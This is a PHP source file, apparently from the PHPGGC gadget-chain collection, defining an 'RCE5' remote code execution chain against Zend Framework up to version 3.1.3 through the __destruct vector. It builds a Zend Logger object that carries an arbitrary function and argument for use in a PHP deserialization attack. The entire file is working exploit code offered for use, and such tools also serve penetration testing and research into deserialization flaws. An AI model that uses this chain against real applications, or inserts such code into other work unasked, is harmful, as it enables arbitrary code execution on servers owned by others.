<?php

namespace GadgetChain\ZendFramework;

class RCE5 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '? <= 3.1.3';
    public static $vector = '__destruct';
    public static $author = 'AFKL';

    public function generate(array $parameters)
    {
		$function = $parameters["function"];
        $parameter = $parameters["parameter"];

        return new \Zend\Log\Logger($function, $parameter);
    }
}